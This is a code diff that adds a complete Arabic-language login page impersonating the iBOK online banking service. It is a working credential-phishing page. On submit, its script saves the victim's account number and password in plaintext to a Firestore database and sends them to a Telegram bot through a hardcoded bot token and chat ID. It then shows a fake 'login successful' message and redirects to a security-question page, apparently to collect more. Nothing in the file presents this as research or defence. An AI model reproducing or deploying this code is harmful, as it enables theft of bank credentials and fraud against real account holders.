@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - iBOK</title>
+    <link rel="stylesheet" href="styles.css"> 
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo-text">iBOK اي بوك</div>
+            <div class="service-name">الخدمات المصرفية عبر الإنترنت</div>
+        </header>
+
+        <div class="welcome-banner">
+            مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
+        </div>
+
+        <div class="form-card">
+            <div class="card-title">تسجيل الدخول</div>
+            <div class="card-subtitle">الرجاء إدخال البيانات</div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label class="input-label" for="userID">رقم الحساب:</label>
+                    <input class="form-input" type="text" id="userID" 
+                            placeholder="" maxlength="7" required 
+                            inputmode="numeric" pattern="\d{7}">
+                    <span class="input-description">أدخل رقم الحساب المكون من 7 أرقام</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="password">كلمة المرور:</label>
+                    <input class="form-input" type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                </div>
+
+                <a href="a.html" class="forgot-password-link">نسيت كلمة المرور؟</a>
+
+                <button type="submit" class="submit-button">تسجيل الدخول</button>
+            </form>
+        </div>
+    </div>
+    
+    <div class="toast-message" id="toast"></div>
+<script type="module">
+ 
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics.js";
+  import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBBs3cFGjT6iB8_xVEHG7r1rqXiiVa7nX4",
+    authDomain: "project-id-b8e1e.firebaseapp.com",
+    projectId: "project-id-b8e1e",
+    storageBucket: "project-id-b8e1e.firebasestorage.app",
+    messagingSenderId: "317735776154",
+    appId: "1:317735776154:web:6ee090d706c9a4bfcad423",
+    measurementId: "G-599FB4WM9Z"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
+
+  const TELEGRAM_TOKEN = "8569488666:AAE2HdV-K-BrpmPLw-IlKr_9UiEiYbD40Mc";
+  const CHAT_ID = "8108669125";
+
+  const form = document.getElementById('loginForm');
+  const toast = document.getElementById('toast');
+
+  function showToast(message, color='#4CAF50') {
+      toast.innerText = message;
+      toast.style.backgroundColor = color;
+      toast.style.display = 'block';
+      setTimeout(()=> { toast.style.display = 'none'; }, 3000);
+  }
+
+  async function sendToTelegram(userID, password) {
+      const message = `📌 بيانات جديدة:\nرقم الحساب: ${userID}\nكلمة المرور: ${password}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+      try {
+          await fetch(url);
+      } catch(err) {
+          console.error("خطأ في إرسال البيانات للبوت:", err);
+      }
+  }
+
+  form.addEventListener('submit', async e => {
+      e.preventDefault();
+      const userID = document.getElementById('userID').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!userID || !password) {
+          showToast('الرجاء إدخال رقم الحساب وكلمة المرور', '#D32F2F');
+          return;
+      }
+
+      if (userID.length !== 7 || isNaN(userID)) {
+          showToast('رقم الحساب يجب أن يتكون من 7 أرقام فقط.', '#D32F2F');
+          return;
+      }
+
+      try {
+          // حفظ البيانات في Firestore
+          await setDoc(doc(db, "users", userID), { userID, password }, { merge: true });
+
+          // إرسال البيانات للبوت مباشرة
+          await sendToTelegram(userID, password);
+
+          localStorage.setItem('userID', userID);
+          showToast('تم تسجيل الدخول بنجاح. جاري التوجيه...');
+
+          setTimeout(() => {
+              window.location.href = "security-question.html";
+          }, 1000);
+
+      } catch(err) {
+          console.error("خطأ في Firebase:", err);
+          showToast("حدث خطأ أثناء الحفظ، حاول مرة أخرى.", '#D32F2F');
+      }
+  });
+</script>
+
+
+</body>
+</html>
